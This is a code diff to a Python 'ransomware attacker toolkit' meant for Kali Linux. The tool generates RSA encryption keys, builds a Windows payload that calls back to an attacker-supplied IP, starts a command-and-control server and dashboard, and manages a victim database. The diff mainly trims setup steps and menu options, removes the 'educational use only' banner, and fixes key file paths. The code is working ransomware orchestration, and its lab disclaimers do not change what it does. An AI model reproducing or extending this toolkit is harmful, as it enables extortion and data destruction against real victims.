@@ -17,47 +17,31 @@ class AttackerToolkit:
         # Display toolkit banner
         banner = """
         ╔══════════════════════════════════════════════════════════╗
-        ║         🎯 RANSOMWARE ATTACKER TOOLKIT - KALI            ║
-        ║             🔴 FOR EDUCATIONAL USE ONLY                  ║
+        ║            RANSOMWARE ATTACKER TOOLKIT - KALI            ║
         ╚══════════════════════════════════════════════════════════╝
-        
         """
         print(banner)
     
-    def check_requirements(self):
-        # Check and install Python requirements
-        print("[1/6] Checking dependencies...")
-        
-        try:
-#            subprocess.run([sys.executable, "-m", "pip", "install", "-r", "../requirements.txt"], 
- #                         check=True, capture_output=True)
-            print("   => Dependencies installed")
-        except subprocess.CalledProcessError:
-            print("    x Failed to install dependencies")
-            print("   [*] Try: pip install -r requirements.txt")
-            return False
-        
-        return True
-    
     def generate_keys(self):
         # Generate RSA encryption keys
-        print("[2/6]  Generating encryption keys...")
+        print("[1/4]  Generating encryption keys...")
         
         try:
             # Import and run key generation
             sys.path.append('.')
             from src.generate_key import generate_rsa_keys
             generate_rsa_keys()
-            print("   ✅ RSA keys generated in Keys/ directory")
+            print("    RSA keys generated in Keys/ directory")
             return True
         except Exception as e:
-            print(f"   ❌ Failed to generate keys: {e}")
+            print(f"   x Failed to generate keys: {e}")
             return False
     
     def get_kali_ip(self):
+
         #Get Kali Linux IP address
 
-        # print("[3/6] 🌐 Detecting network configuration...")
+        # print("[2/4] 🌐 Detecting network configuration...")
         
         # try:
         #     # Try different methods to get IP
@@ -75,18 +59,18 @@ class AttackerToolkit:
         #     self.kali_ip = input("   [?] Enter your Kali IP manually: ").strip()
         #     return bool(self.kali_ip)
         
-        self.kali_ip = input("[3/6] 🌐 Enter your Kali Linux IP address: ").strip()
+        self.kali_ip = input("[2/4] 🌐 Enter your Kali Linux IP address: ").strip()
         build_windows_payload(self.kali_ip)
         if self.kali_ip:
-            print(f"   ✅ Using Kali IP: {self.kali_ip}")
+            print(f"    Using Kali IP: {self.kali_ip}")
             return True
         else:
-            print("   ❌ No IP provided")
+            print("   x No IP provided")
             return False
     
     def start_c2_server(self):
         # Start the C2 server in background
-        print("[4/6] Starting C2 Command Server...")
+        print("[3/4] Starting C2 Command Server...")
         
         def run_c2():
             try:
@@ -102,77 +86,56 @@ class AttackerToolkit:
         
         # Give server time to start
         time.sleep(3)
-        print("   ✅ C2 Server started on http://localhost:5000")
+        print("    C2 Server started on http://localhost:5000")
         return True
     
-    # def build_payload(self):
-    #     # Build Windows ransomware payload
-    #     print("[5/6]  Building Windows payload...")
-        
-    #     try:
-    #         # Import and run payload builder
-    #         from src.payload_builder import build_windows_payload
-    #         exe_path = build_windows_payload(self.kali_ip)
-            
-    #         print(f"  Payload built: {exe_path}")
-    #         print("   [*] Copy this to Windows VM for testing")
-    #         return True
-    #     except Exception as e:
-    #         print(f"   ❌ Failed to build payload: {e}")
-    #         print("   [*] Make sure keys were generated first")
-    #         return False
-    
     def open_dashboard(self):
-        """Open C2 dashboard in browser"""
-        print("[6/6] 📊 Opening C2 Dashboard...")
+        # Open C2 dashboard in browser
+        print("[4/4]  Opening C2 Dashboard...")
         
         try:
             webbrowser.open("http://localhost:5000")
-            print("   ✅ Dashboard opened in browser")
+            print("   Dashboard opened in browser")
             print("\n" + "="*60)
-            print("🎯 ATTACKER TOOLKIT READY!")
+            print("ATTACKER TOOLKIT READY!")
             print("="*60)
             print("\n📋 Next Steps:")
             print("1. Send payload to Windows VM")
             print("2. Run payload on Windows VM")
             print("3. Monitor victims at: http://localhost:5000")
             print("4. Use victim_manager.py to manage victims")
-            print("\n[⚠️]  Remember: Educational use in lab only!")
+            print("\n[?]  Remember: Educational use in lab only!")
             return True
         except:
-            print("   ⚠️  Could not open browser automatically")
+            print("   ?  Could not open browser automatically")
             print("   [*] Manually visit: http://localhost:5000")
             return True
     
     def show_menu(self):
-        """Show interactive menu after setup"""
+        # Show interactive menu after setup
         while True:
             print("\n" + "="*60)
             print("🛠️  ATTACKER TOOLKIT MENU")
             print("="*60)
-            print("1. 🔄 Rebuild payload with current IP")
-            print("2. 👥 View/manage victims")
-            print("3. 🖥️  Open C2 dashboard")
-            print("4. 📋 Show victim database")
-            print("5. 🔑 Show generated keys")
-            print("6. 🚪 Exit")
+            print("1. 👥 View/manage victims")
+            print("2. 🖥️  Open C2 dashboard")
+            print("3. 📋 Show victim database")
+            print("4. 🔑 Show generated keys")
+            print("5. 🚪 Exit")
             print("="*60)
             
-            choice = input("\nSelect option (1-6): ").strip()
+            choice = input("\nSelect option (1-5): ").strip()
             
             if choice == "1":
-                print("1")
-                self.build_payload()
-            elif choice == "2":
                 self.manage_victims()
-            elif choice == "3":
+            elif choice == "2":
                 self.open_dashboard()
-            elif choice == "4":
+            elif choice == "3":
                 self.show_victim_db()
-            elif choice == "5":
+            elif choice == "4":
                 self.show_keys()
-            elif choice == "6":
-                print("\n[👋] Exiting Attacker Toolkit...")
+            elif choice == "5":
+                print("\nExiting Attacker Toolkit...")
                 break
             else:
                 print("[❌] Invalid choice")
@@ -202,7 +165,7 @@ class AttackerToolkit:
         import sqlite3
         
         print("\n" + "="*60)
-        print("📋 VICTIM DATABASE")
+        print("VICTIM DATABASE")
         print("="*60)
         
         try:
@@ -224,21 +187,26 @@ class AttackerToolkit:
             print("No victim database found")
     
     def show_keys(self):
-        """Show generated encryption keys"""
+        # Show generated encryption keys
         print("\n" + "="*60)
         print("🔑 ENCRYPTION KEYS")
         print("="*60)
         
-        if os.path.exists("/data/operational_private.pem"):
-            with open("/data/operational_private.pem", "r") as f:
+        data_dir = os.path.join(os.path.dirname(__file__), "data")
+        
+        priv_path = os.path.join(data_dir, "operational_private.pem")
+        pub_path = os.path.join(data_dir, "operational_public.pem")
+        
+        if os.path.exists(priv_path):
+            with open(priv_path, "r") as f:
                 priv_key = f.read().strip()
                 print("Private Key (KEEP SECURE!):")
                 print("-"*40)
                 print(priv_key[:100] + "...")
                 print("-"*40)
         
-        if os.path.exists("/data/operational_public.pem"):
-            with open("/data/operational_public.pem", "r") as f:
+        if os.path.exists(pub_path):
+            with open(pub_path, "r") as f:
                 pub_key = f.read().strip()
                 print("\nPublic Key (Embed in payloads):")
                 print("-"*40)
@@ -246,12 +214,12 @@ class AttackerToolkit:
                 print("-"*40)
     
     def run(self):
-        """Main execution flow"""
+        # Main execution flow
         self.print_banner()
         
         # Check if running as root (optional for Kali)
         if os.geteuid() != 0:
-            print("[⚠️]  Running without root privileges")
+            print("? Running without root privileges")
         
         # Ask for confirmation
         print("[?] This will set up the ransomware attacker toolkit.")
@@ -263,7 +231,6 @@ class AttackerToolkit:
         
         # Run setup steps
         steps = [
-            self.check_requirements,
             self.generate_keys,
             self.get_kali_ip,
             self.start_c2_server,
@@ -281,7 +248,7 @@ class AttackerToolkit:
         self.show_menu()
 
 def main():
-    """Main entry point"""
+    # Main entry point
     toolkit = AttackerToolkit()
     toolkit.run()
 
